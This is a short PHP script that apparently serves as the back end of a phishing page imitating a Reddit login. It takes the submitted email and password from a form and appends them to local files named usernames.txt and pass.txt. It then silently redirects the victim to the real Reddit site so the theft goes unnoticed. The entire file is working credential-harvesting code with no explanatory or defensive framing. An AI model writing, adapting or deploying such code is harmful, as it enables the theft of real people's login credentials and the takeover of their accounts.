<?php

file_put_contents("usernames.txt", "Reddit Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Reddit Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.reddit.com');
?>
